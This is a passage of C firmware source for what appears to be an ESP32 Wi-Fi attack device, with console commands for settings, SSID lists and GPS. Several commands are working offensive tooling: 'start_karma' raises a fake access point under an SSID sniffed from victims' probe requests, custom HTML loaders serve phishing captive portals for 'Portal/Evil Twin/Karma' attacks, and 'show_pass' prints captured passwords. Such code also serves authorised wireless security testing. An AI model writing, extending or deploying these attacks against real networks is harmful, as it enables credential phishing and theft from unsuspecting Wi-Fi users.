            MY_LOG_INFO(TAG, "Value must be at least 1 ms");
            return 1;
        }

        if (strcasecmp(argv[2], "min") == 0) {
            if (value > CHANNEL_TIME_MIN_LIMIT) {
                MY_LOG_INFO(TAG, "Value %d exceeds limit, setting to max allowed %d ms", value, CHANNEL_TIME_MIN_LIMIT);
                value = CHANNEL_TIME_MIN_LIMIT;
            }
            g_scan_min_channel_time = (uint32_t)value;
            if (g_scan_min_channel_time > g_scan_max_channel_time) {
                g_scan_max_channel_time = g_scan_min_channel_time;
                MY_LOG_INFO(TAG, "Min channel time set to %u ms (max adjusted to %u ms)", 
                            (unsigned int)g_scan_min_channel_time, (unsigned int)g_scan_max_channel_time);
            } else {
                MY_LOG_INFO(TAG, "Min channel time set to %u ms", (unsigned int)g_scan_min_channel_time);
            }
            channel_time_persist_state();
            return 0;
        } else if (strcasecmp(argv[2], "max") == 0) {
            if (value > CHANNEL_TIME_MAX_LIMIT) {
                MY_LOG_INFO(TAG, "Value %d exceeds limit, setting to max allowed %d ms", value, CHANNEL_TIME_MAX_LIMIT);
                value = CHANNEL_TIME_MAX_LIMIT;
            }
            g_scan_max_channel_time = (uint32_t)value;
            if (g_scan_max_channel_time < g_scan_min_channel_time) {
                g_scan_min_channel_time = g_scan_max_channel_time;
                MY_LOG_INFO(TAG, "Max channel time set to %u ms (min adjusted to %u ms)", 
                            (unsigned int)g_scan_max_channel_time, (unsigned int)g_scan_min_channel_time);
            } else {
                MY_LOG_INFO(TAG, "Max channel time set to %u ms", (unsigned int)g_scan_max_channel_time);
            }
            channel_time_persist_state();
            return 0;
        }
        MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms>");
        return 1;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: channel_time read <min|max>");
            return 1;
        }
        if (strcasecmp(argv[2], "min") == 0) {
            MY_LOG_INFO(TAG, "%u", (unsigned int)g_scan_min_channel_time);
            return 0;
        } else if (strcasecmp(argv[2], "max") == 0) {
            MY_LOG_INFO(TAG, "%u", (unsigned int)g_scan_max_channel_time);
            return 0;
        }
        MY_LOG_INFO(TAG, "Usage: channel_time read <min|max>");
        return 1;
    }

    MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms> | channel_time read <min|max>");
    return 1;
}

static boot_action_config_t* boot_get_action_slot(const char* which) {
    if (which == NULL) {
        return NULL;
    }
    if (strcasecmp(which, "short") == 0) {
        return &boot_config.short_press;
    }
    if (strcasecmp(which, "long") == 0) {
        return &boot_config.long_press;
    }
    return NULL;
}

static int cmd_boot_button(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: boot_button read | boot_button list | boot_button set <short|long> <command[, command...]> | boot_button status <short|long> <on|off>");
        return 1;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        boot_config_print();
        return 0;
    }

    if (strcasecmp(argv[1], "list") == 0) {
        boot_list_allowed_commands();
        return 0;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 4) {
            MY_LOG_INFO(TAG, "Usage: boot_button set <short|long> <command[, command...]>");
            boot_list_allowed_commands();
            return 1;
        }
        boot_action_config_t* slot = boot_get_action_slot(argv[2]);
        if (slot == NULL) {
            MY_LOG_INFO(TAG, "Unknown target '%s' (use short|long)", argv[2]);
            return 1;
        }

        char flow[BOOTCFG_CMD_MAX_LEN];
        if (!boot_build_command_flow_from_argv(argc, argv, 3, flow, sizeof(flow))) {
            MY_LOG_INFO(TAG, "Boot flow too long (max %d chars)", BOOTCFG_CMD_MAX_LEN - 1);
            return 1;
        }

        char detail[BOOTCFG_CMD_MAX_LEN];
        boot_flow_validation_result_t validation = boot_validate_command_flow(flow, detail, sizeof(detail));
        if (validation == BOOT_FLOW_INVALID_COMMAND) {
            MY_LOG_INFO(TAG, "Command '%s' not allowed", detail);
            boot_list_allowed_commands();
            return 1;
        }
        if (validation != BOOT_FLOW_VALID) {
            MY_LOG_INFO(TAG, "Malformed boot flow. Separate commands with commas.");
            boot_list_allowed_commands();
            return 1;
        }

        strlcpy(slot->command, flow, sizeof(slot->command));
        boot_config_persist();
        boot_config_print();
        return 0;
    }

    if (strcasecmp(argv[1], "status") == 0) {
        if (argc < 4) {
            MY_LOG_INFO(TAG, "Usage: boot_button status <short|long> <on|off>");
            return 1;
        }
        boot_action_config_t* slot = boot_get_action_slot(argv[2]);
        if (slot == NULL) {
            MY_LOG_INFO(TAG, "Unknown target '%s' (use short|long)", argv[2]);
            return 1;
        }
        if (strcasecmp(argv[3], "on") == 0) {
            slot->enabled = true;
        } else if (strcasecmp(argv[3], "off") == 0) {
            slot->enabled = false;
        } else {
            MY_LOG_INFO(TAG, "Status must be on|off");
            return 1;
        }
        boot_config_persist();
        boot_config_print();
        return 0;
    }

    MY_LOG_INFO(TAG, "Unknown subcommand. Use: read | list | set | status");
    return 1;
}

static int cmd_vendor(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: vendor set <on|off> | vendor read");
        return 1;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: vendor set <on|off>");
            return 1;
        }

        bool enable;
        if (strcasecmp(argv[2], "on") == 0) {
            enable = true;
        } else if (strcasecmp(argv[2], "off") == 0) {
            enable = false;
        } else {
            MY_LOG_INFO(TAG, "Usage: vendor set <on|off>");
            return 1;
        }

        vendor_set_enabled(enable);
        if (enable && sd_card_mounted) {
            ensure_vendor_file_checked();
        }

        MY_LOG_INFO(TAG, "Vendor scan: %s", vendor_is_enabled() ? "on" : "off");
        if (vendor_is_enabled()) {
            if (!sd_card_mounted) {
                MY_LOG_INFO(TAG, "Vendor file: waiting for SD card");
            } else {
                MY_LOG_INFO(TAG, "Vendor file: %s (%u entries)",
                            vendor_file_present ? "available" : "missing",
                            (unsigned int)vendor_record_count);
            }
        }
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (vendor_is_enabled() && sd_card_mounted) {
            ensure_vendor_file_checked();
        }
        MY_LOG_INFO(TAG, "Vendor scan: %s", vendor_is_enabled() ? "on" : "off");
        if (vendor_is_enabled()) {
            if (!sd_card_mounted) {
                MY_LOG_INFO(TAG, "Vendor file: waiting for SD card");
            } else {
                MY_LOG_INFO(TAG, "Vendor file: %s (%u entries)",
                            vendor_file_present ? "available" : "missing",
                            (unsigned int)vendor_record_count);
            }
        }
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: vendor set <on|off> | vendor read");
    return 1;
}

static int cmd_display(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read");
        return 1;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        display_type_t detected = oled_display_get_type();
        const char *detected_name = "none";
        switch (detected) {
            case DISPLAY_SSD1306: detected_name = "ssd1306"; break;
            case DISPLAY_SH1107: detected_name = "sh1107"; break;
            case DISPLAY_SH1106: detected_name = "sh1106"; break;
            case DISPLAY_UNIT_LCD: detected_name = "unit_lcd"; break;
            case DISPLAY_NONE:
            default: detected_name = "none"; break;
        }
        MY_LOG_INFO(TAG, "Display mode: %s", display_mode_to_str(display_forced_mode));
        MY_LOG_INFO(TAG, "Detected now: %s (addr raw 0x%02X / 7-bit 0x%02X)",
                    detected_name,
                    (int)oled_display_get_i2c_addr_raw(),
                    (int)oled_display_get_i2c_addr_7bit());
        return 0;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: display set <auto|ssd1306|sh1107|sh1106|unit_lcd>");
            return 1;
        }
        display_type_t mode = DISPLAY_NONE;
        if (!display_mode_from_str(argv[2], &mode)) {
            MY_LOG_INFO(TAG, "Unknown mode '%s'. Use: auto|ssd1306|sh1107|sh1106|unit_lcd", argv[2]);
            return 1;
        }
        display_forced_mode = mode;
        oled_display_set_forced_type(display_forced_mode);
        display_mode_save_to_nvs(display_forced_mode);
        MY_LOG_INFO(TAG, "Display mode saved: %s", display_mode_to_str(display_forced_mode));
        MY_LOG_INFO(TAG, "Reboot required to re-initialize display driver");
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read");
    return 1;
}

// Command: start_karma - Starts portal with SSID from probe list
static int cmd_start_karma(int argc, char **argv)
{
    oled_display_update_full("> Karma Attack",
        argc >= 2 ? argv[1] : "  No index",
        "  Fake AP up", "  Capturing...");
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_karma <index>");
        MY_LOG_INFO(TAG, "Example: start_karma 2");
        MY_LOG_INFO(TAG, "Use 'list_probes' to see available SSIDs with their indexes");
        return 1;
    }
    
    // Check if we have any probes captured
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data first.");
        return 1;
    }
    
    // Parse the index argument
    int target_index = atoi(argv[1]);
    
    if (target_index < 1) {
        MY_LOG_INFO(TAG, "Invalid index %d. Must be >= 1", target_index);
        MY_LOG_INFO(TAG, "Use 'list_probes' to see available indexes");
        return 1;
    }
    
    // Find the N-th unique SSID (same logic as list_probes)
    int unique_count = 0;
    char *selected_ssid = NULL;
    
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        
        // Check if this SSID has already been seen
        bool already_seen = false;
        for (int j = 0; j < i; j++) {
            if (strcmp(probe->ssid, probe_requests[j].ssid) == 0) {
                already_seen = true;
                break;
            }
        }
        
        // If not seen yet, it's a unique SSID
        if (!already_seen) {
            unique_count++;
            if (unique_count == target_index) {
                selected_ssid = probe->ssid;
                break;
            }
        }
    }
    
    if (selected_ssid == NULL) {
        MY_LOG_INFO(TAG, "Invalid index %d. Valid range: 1-%d", target_index, unique_count);
        MY_LOG_INFO(TAG, "Use 'list_probes' to see available indexes");
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Starting Karma attack with SSID: %s", selected_ssid);
    
    {
        char karma_l2[64];
        snprintf(karma_l2, sizeof(karma_l2), ">> %s", selected_ssid);
        oled_display_update_full("> Karma Attack", karma_l2, "  Fake AP up", "  Capturing...");
    }
    
    karma_mode_active = true;
    
    // Prepare arguments for cmd_start_portal
    char *portal_argv[2];
    portal_argv[0] = "start_portal";
    portal_argv[1] = selected_ssid;
    
    // Call cmd_start_portal with the selected SSID
    return cmd_start_portal(2, portal_argv);
}

// Load preset SSIDs from /sdcard/lab/ssid.txt
static int load_ssid_presets(char ssids[][MAX_SSID_NAME_LEN + 1], int max_entries) {
    if (max_entries <= 0) {
        return 0;
    }

    FILE *f = fopen(SSID_PRESET_PATH, "r");
    if (f == NULL) {
        return -1;
    }

    char line[96];
    int count = 0;
    while ((count < max_entries) && fgets(line, sizeof(line), f)) {
        char *start = line;
        while (*start && isspace((unsigned char)*start)) {
            start++;
        }
        if (*start == '\0') {
            continue;
        }
        char *end = start + strlen(start);
        while (end > start && (end[-1] == '\n' || end[-1] == '\r')) {
            *--end = '\0';
        }
        while (end > start && isspace((unsigned char)end[-1])) {
            *--end = '\0';
        }
        if (*start == '\0') {
            continue;
        }
        size_t len = strlen(start);
        if (len > MAX_SSID_NAME_LEN) {
            start[MAX_SSID_NAME_LEN] = '\0';
        }
        strncpy(ssids[count], start, MAX_SSID_NAME_LEN);
        ssids[count][MAX_SSID_NAME_LEN] = '\0';
        count++;
    }

    fclose(f);
    return count;
}

static void report_ssid_file_status(void) {
    char ssids[MAX_SSID_PRESETS][MAX_SSID_NAME_LEN + 1];
    int count = load_ssid_presets(ssids, MAX_SSID_PRESETS);
    if (count < 0) {
        MY_LOG_INFO(TAG, "ssid.txt not found - manual SSID entry only");
        return;
    }
    MY_LOG_INFO(TAG, "ssid.txt found with %d preset SSID(s)", count);
}

static void ensure_ssids_file(void) {
    FILE *f = fopen(SSIDS_FILE_PATH, "r");
    if (f == NULL) {
        f = fopen(SSIDS_FILE_PATH, "w");
        if (f) {
            fclose(f);
            sd_sync();
            MY_LOG_INFO(TAG, "ssids.txt created (empty)");
        } else {
            MY_LOG_INFO(TAG, "Failed to create ssids.txt");
        }
        return;
    }
    int count = 0;
    char line[96];
    while (fgets(line, sizeof(line), f)) {
        char *s = line;
        while (*s && isspace((unsigned char)*s)) s++;
        char *e = s + strlen(s);
        while (e > s && (e[-1] == '\n' || e[-1] == '\r')) *--e = '\0';
        while (e > s && isspace((unsigned char)e[-1])) *--e = '\0';
        if (*s != '\0') count++;
    }
    fclose(f);
    MY_LOG_INFO(TAG, "ssids.txt found with %d SSID(s)", count);
}

// Command: list_ssid - Lists SSIDs from ssid.txt on SD card
static int cmd_list_ssid(int argc, char **argv)
{
    (void)argc; (void)argv;

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }

    char ssids[MAX_SSID_PRESETS][MAX_SSID_NAME_LEN + 1];
    int count = load_ssid_presets(ssids, MAX_SSID_PRESETS);
    if (count < 0) {
        MY_LOG_INFO(TAG, "ssid.txt not found on SD card.");
        return 0;
    }

    if (count == 0) {
        MY_LOG_INFO(TAG, "ssid.txt is empty - manual SSID entry only.");
        return 0;
    }

    MY_LOG_INFO(TAG, "SSID presets from ssid.txt:");
    for (int i = 0; i < count; i++) {
        printf("%d %s\n", i + 1, ssids[i]);
    }

    return 0;
}

static int cmd_list_ssids(int argc, char **argv)
{
    (void)argc; (void)argv;

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    FILE *f = fopen(SSIDS_FILE_PATH, "r");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "ssids.txt not found on SD card.");
        return 0;
    }

    char line[96];
    int idx = 0;
    while (fgets(line, sizeof(line), f)) {
        char *start = line;
        while (*start && isspace((unsigned char)*start)) start++;
        char *end = start + strlen(start);
        while (end > start && (end[-1] == '\n' || end[-1] == '\r')) *--end = '\0';
        while (end > start && isspace((unsigned char)end[-1])) *--end = '\0';
        if (*start == '\0') continue;
        idx++;
        printf("%d %s\n", idx, start);
    }
    fclose(f);

    if (idx == 0) {
        MY_LOG_INFO(TAG, "ssids.txt is empty.");
    }
    return 0;
}

static int cmd_add_ssid(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: add_ssid <SSID>");
        return 1;
    }

    int len = strlen(argv[1]);
    if (len == 0 || len > MAX_SSID_NAME_LEN) {
        MY_LOG_INFO(TAG, "SSID length must be 1-%d characters", MAX_SSID_NAME_LEN);
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    FILE *f = fopen(SSIDS_FILE_PATH, "a");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "Failed to open ssids.txt for writing");
        return 1;
    }
    fprintf(f, "%s\n", argv[1]);
    fclose(f);
    sd_sync();

    MY_LOG_INFO(TAG, "Added SSID: %s", argv[1]);
    return 0;
}

static int cmd_remove_ssid(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: remove_ssid <index>");
        return 1;
    }

    int target = atoi(argv[1]);
    if (target < 1) {
        MY_LOG_INFO(TAG, "Index must be >= 1");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    char lines[MAX_SSID_PRESETS][MAX_SSID_NAME_LEN + 1];
    int count = 0;
    {
        FILE *rf = fopen(SSIDS_FILE_PATH, "r");
        if (rf == NULL) {
            MY_LOG_INFO(TAG, "ssids.txt not found on SD card.");
            return 1;
        }
        char line[96];
        while (count < MAX_SSID_PRESETS && fgets(line, sizeof(line), rf)) {
            char *s = line;
            while (*s && isspace((unsigned char)*s)) s++;
            char *e = s + strlen(s);
            while (e > s && (e[-1] == '\n' || e[-1] == '\r')) *--e = '\0';
            while (e > s && isspace((unsigned char)e[-1])) *--e = '\0';
            if (*s == '\0') continue;
            strncpy(lines[count], s, MAX_SSID_NAME_LEN);
            lines[count][MAX_SSID_NAME_LEN] = '\0';
            count++;
        }
        fclose(rf);
    }

    if (target > count) {
        MY_LOG_INFO(TAG, "Index %d out of range (1-%d)", target, count);
        return 1;
    }

    MY_LOG_INFO(TAG, "Removing SSID %d: %s", target, lines[target - 1]);

    FILE *f = fopen(SSIDS_FILE_PATH, "w");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "Failed to open ssids.txt for writing");
        return 1;
    }
    for (int i = 0; i < count; i++) {
        if (i == target - 1) continue;
        fprintf(f, "%s\n", lines[i]);
    }
    fclose(f);
    sd_sync();

    MY_LOG_INFO(TAG, "SSID removed. %d SSIDs remaining.", count - 1);
    return 0;
}

// Command: list_sd - Lists HTML files on SD card
static int cmd_list_sd(int argc, char **argv)
{
    (void)argc; (void)argv;
    
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }
    
    DIR *dir = opendir("/sdcard/lab/htmls");
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/htmls directory. Error: %d (%s)", errno, strerror(errno));
        return 1;
    }
    
    sd_html_count = 0;
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL && sd_html_count < MAX_HTML_FILES) {
        // Skip directories and special entries
        if (entry->d_type == DT_DIR) {
            continue;
        }
        
        // Skip macOS metadata files (._filename or _filename in MS-DOS 8.3)
        if (entry->d_name[0] == '.' || entry->d_name[0] == '_') {
            continue;
        }
        
        // Check if file ends with .html or .htm (case insensitive)
        size_t len = strlen(entry->d_name);
        bool is_html = false;
        
        if (len > 5) {
            const char *ext = entry->d_name + len - 5;
            if (strcasecmp(ext, ".html") == 0) {
                is_html = true;
            }
        }
        
        if (!is_html && len > 4) {
            const char *ext = entry->d_name + len - 4;
            if (strcasecmp(ext, ".htm") == 0) {
                is_html = true;
            }
        }
        
        if (is_html) {
            strncpy(sd_html_files[sd_html_count], entry->d_name, MAX_HTML_FILENAME - 1);
            sd_html_files[sd_html_count][MAX_HTML_FILENAME - 1] = '\0';
            sd_html_count++;
        }
    }
    
    closedir(dir);
    
    if (sd_html_count == 0) {
        MY_LOG_INFO(TAG, "No HTML files found on SD card.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "HTML files found on SD card:");
    for (int i = 0; i < sd_html_count; i++) {
        printf("%d %s\n", i + 1, sd_html_files[i]);
    }
    
    return 0;
}

// Command: show_pass - Prints password log contents from SD card
static int cmd_show_pass(int argc, char **argv)
{
    const char *target = "portal";
    if (argc >= 2 && argv[1] != NULL && argv[1][0] != '\0') {
        target = argv[1];
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }

    const char *path = "/sdcard/lab/portals.txt";
    if (strcasecmp(target, "evil") == 0 || strcasecmp(target, "eviltwin") == 0) {
        path = "/sdcard/lab/eviltwin.txt";
    }

    FILE *file = fopen(path, "r");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "%s not found on SD card.", path);
        return 0;
    }

    char line[128];
    bool has_lines = false;
    while (fgets(line, sizeof(line), file) != NULL) {
        has_lines = true;
        printf("%s", line);
    }
    fclose(file);

    if (!has_lines) {
        MY_LOG_INFO(TAG, "%s is empty.", path);
    }

    return 0;
}

static bool build_sd_path(char *dest, size_t dest_size, const char *input_path)
{
    if (!dest || dest_size == 0 || !input_path || input_path[0] == '\0') {
        return false;
    }

    if (input_path[0] == '/') {
        strncpy(dest, input_path, dest_size - 1);
        dest[dest_size - 1] = '\0';
    } else {
        snprintf(dest, dest_size, "/sdcard/%s", input_path);
    }

    size_t len = strlen(dest);
    while (len > 1 && dest[len - 1] == '/') {
        dest[--len] = '\0';
    }

    return dest[0] != '\0';
}

// Command: list_dir [path] - Lists files inside a directory on SD card
static int cmd_list_dir(int argc, char **argv)
{
    const char *input_path = (argc >= 2) ? argv[1] : "lab/handshakes";
    char full_path[SD_PATH_MAX];

    if (!build_sd_path(full_path, sizeof(full_path), input_path)) {
        MY_LOG_INFO(TAG, "Invalid path provided.");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    DIR *dir = opendir(full_path);
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open %s. Error: %d (%s)", full_path, errno, strerror(errno));
        return 1;
    }

    MY_LOG_INFO(TAG, "Files in %s:", full_path);

    struct dirent *entry;
    int file_count = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            continue;
        }
        if (entry->d_name[0] == '.' || entry->d_name[0] == '_') {
            continue;
        }
        file_count++;
        printf("%d %s\n", file_count, entry->d_name);
    }

    closedir(dir);

    if (file_count == 0) {
        MY_LOG_INFO(TAG, "No files found in %s", full_path);
    } else {
        MY_LOG_INFO(TAG, "Found %d file(s) in %s", file_count, full_path);
    }

    return 0;
}

// Command: file_delete <path> - Deletes a file on SD card
static int cmd_file_delete(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: file_delete <path>");
        MY_LOG_INFO(TAG, "Example: file_delete lab/handshakes/sample.pcap");
        return 1;
    }

    char full_path[SD_PATH_MAX];
    if (!build_sd_path(full_path, sizeof(full_path), argv[1])) {
        MY_LOG_INFO(TAG, "Invalid path provided.");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    struct stat st;
    if (stat(full_path, &st) != 0) {
        MY_LOG_INFO(TAG, "File not found: %s (errno: %d)", full_path, errno);
        return 1;
    }

    if (S_ISDIR(st.st_mode)) {
        MY_LOG_INFO(TAG, "Refusing to delete directory: %s", full_path);
        return 1;
    }

    if (unlink(full_path) != 0) {
        MY_LOG_INFO(TAG, "Failed to delete %s: %s", full_path, strerror(errno));
        return 1;
    }
    sd_sync();

    MY_LOG_INFO(TAG, "Deleted %s", full_path);
    return 0;
}

// Command: select_html [index] - Loads HTML file from SD card
static int cmd_select_html(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: select_html <index>");
        MY_LOG_INFO(TAG, "Run list_sd first to see available HTML files.");
        return 1;
    }
    
    int index = atoi(argv[1]) - 1; // Convert from 1-based to 0-based
    
    if (index < 0 || index >= sd_html_count) {
        MY_LOG_INFO(TAG, "Invalid index. Run list_sd to see available files.");
        return 1;
    }
    
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }
    
    char filepath[128];
    snprintf(filepath, sizeof(filepath), "/sdcard/lab/htmls/%s", sd_html_files[index]);
    
    // Open file and get size
    FILE *f = fopen(filepath, "r");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "Failed to open file: %s", filepath);
        return 1;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (fsize <= 0 || fsize > 800000) { // Limit to 800KB
        MY_LOG_INFO(TAG, "File size invalid or too large: %ld bytes", fsize);
        fclose(f);
        return 1;
    }
    
    // Free previous custom HTML if exists
    if (custom_portal_html != NULL) {
        free(custom_portal_html);
        custom_portal_html = NULL;
    }
    
    // Allocate memory and read file
    custom_portal_html = (char*)malloc(fsize + 1);
    if (custom_portal_html == NULL) {
        MY_LOG_INFO(TAG, "Failed to allocate memory for HTML file.");
        fclose(f);
        return 1;
    }
    
    size_t bytes_read = fread(custom_portal_html, 1, fsize, f);
    custom_portal_html[bytes_read] = '\0';
    fclose(f);
    
    MY_LOG_INFO(TAG, "Loaded HTML file: %s (%u bytes)", sd_html_files[index], (unsigned int)bytes_read);
    MY_LOG_INFO(TAG, "Portal will now use this custom HTML.");
    
    return 0;
}

// Command: set_html - Sets custom HTML from command line argument
static int cmd_set_html(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: set_html <html_string>");
        MY_LOG_INFO(TAG, "Example: set_html <!DOCTYPE html><html>...</html>");
        return 1;
    }
    
    // Concatenate all arguments (HTML may contain spaces)
    size_t total_len = 0;
    for (int i = 1; i < argc; i++) {
        total_len += strlen(argv[i]) + 1; // +1 for space
    }
    
    // Free previous custom HTML if exists
    if (custom_portal_html != NULL) {
        free(custom_portal_html);
        custom_portal_html = NULL;
    }
    
    // Allocate and build the HTML string
    custom_portal_html = (char*)malloc(total_len + 1);
    if (custom_portal_html == NULL) {
        MY_LOG_INFO(TAG, "Failed to allocate memory for HTML.");
        return 1;
    }
    
    custom_portal_html[0] = '\0';
    for (int i = 1; i < argc; i++) {
        strcat(custom_portal_html, argv[i]);
        if (i < argc - 1) {
            strcat(custom_portal_html, " ");
        }
    }
    
    MY_LOG_INFO(TAG, "Custom HTML set (%u bytes). Portal/Evil Twin/Karma will use this HTML.",
                (unsigned int)strlen(custom_portal_html));
    return 0;
}

static void gps_raw_task(void *pvParameters) {
    (void)pvParameters;

    MY_LOG_INFO(TAG, "GPS raw reader started. Use 'stop' to exit.");

    while (gps_raw_active && !operation_stop_requested) {
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t *)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(500));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char *line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                MY_LOG_INFO(TAG, "[GPS RAW] %s", line);
                line = strtok(NULL, "\r\n");
            }
        }
    }

    gps_raw_active = false;
    operation_stop_requested = false;
    gps_raw_task_handle = NULL;
    MY_LOG_INFO(TAG, "GPS raw reader stopped.");
    vTaskDelete(NULL);
}

static int cmd_gps_set(int argc, char **argv) {
    if (argc < 2 || argv[1] == NULL) {
        MY_LOG_INFO(TAG, "Usage: gps_set <m5|atgm|external|cap>");
        MY_LOG_INFO(TAG, "Current GPS module: %s (baud %d)",
                    gps_get_module_name(current_gps_module),
                    gps_get_baud_for_module(current_gps_module));
        return 0;
    }

    gps_module_t selected = current_gps_module;
    if (strcasecmp(argv[1], "m5") == 0 || strcasecmp(argv[1], "m5stack") == 0 || strcasecmp(argv[1], "m5stackgps1.1") == 0 || strcasecmp(argv[1], "m5stackgpsv11") == 0) {
        selected = GPS_MODULE_M5STACK_GPS_V11;
    } else if (strcasecmp(argv[1], "atgm") == 0 || strcasecmp(argv[1], "atgm336h") == 0) {
        selected = GPS_MODULE_ATGM336H;
    } else if (strcasecmp(argv[1], "external") == 0 || strcasecmp(argv[1], "ext") == 0 ||
               strcasecmp(argv[1], "usb") == 0 || strcasecmp(argv[1], "tab") == 0 ||
               strcasecmp(argv[1], "tab5") == 0) {
        selected = GPS_MODULE_EXTERNAL;
    } else if (strcasecmp(argv[1], "cap") == 0 || strcasecmp(argv[1], "external_cap") == 0 ||
               strcasecmp(argv[1], "lora_cap") == 0 || strcasecmp(argv[1], "adv_cap") == 0) {
        selected = GPS_MODULE_EXTERNAL_CAP;
    } else {
        MY_LOG_INFO(TAG, "Unknown module '%s'. Use 'm5', 'atgm', 'external' (usb alias) or 'cap'.", argv[1]);
        return 1;
    }

    current_gps_module = selected;
    if (gps_module_uses_external_feed(current_gps_module)) {
        gps_sync_from_selected_external_source();
    }
    gps_save_state_to_nvs();
    MY_LOG_INFO(TAG, "GPS module set to %s (baud %d). Restart GPS tasks if running.",
                gps_get_module_name(current_gps_module),
                gps_get_baud_for_module(current_gps_module));
    return 0;
}

static int cmd_set_gps_position(int argc, char **argv) {
    if (argc == 1) {
        external_gps_position.valid = false;
        if (current_gps_module == GPS_MODULE_EXTERNAL) {
            gps_sync_from_selected_external_source();
        }
        oled_display_update_full("> GPS External", "  Fix cleared", "", "  No fix");
        MY_LOG_INFO(TAG, "External GPS fix cleared (no fix).");
        return 0;
    }

    if (argc < 3 || argc > 5 || argv[1] == NULL || argv[2] == NULL) {
        MY_LOG_INFO(TAG, "Usage: set_gps_position <lat> <lon> [alt] [acc]");
        MY_LOG_INFO(TAG, "Usage: set_gps_position   (no args = lost fix)");
        return 1;
    }

    char *endptr = NULL;
    float lat = strtof(argv[1], &endptr);
    if (endptr == argv[1] || (endptr != NULL && *endptr != '\0') || !isfinite(lat)) {
        MY_LOG_INFO(TAG, "Invalid latitude: '%s'", argv[1]);
        return 1;
    }

    endptr = NULL;
    float lon = strtof(argv[2], &endptr);
    if (endptr == argv[2] || (endptr != NULL && *endptr != '\0') || !isfinite(lon)) {
        MY_LOG_INFO(TAG, "Invalid longitude: '%s'", argv[2]);
        return 1;
    }

    if (lat < -90.0f || lat > 90.0f) {
        MY_LOG_INFO(TAG, "Latitude out of range (-90..90): %.7f", lat);
        return 1;
    }
    if (lon < -180.0f || lon > 180.0f) {
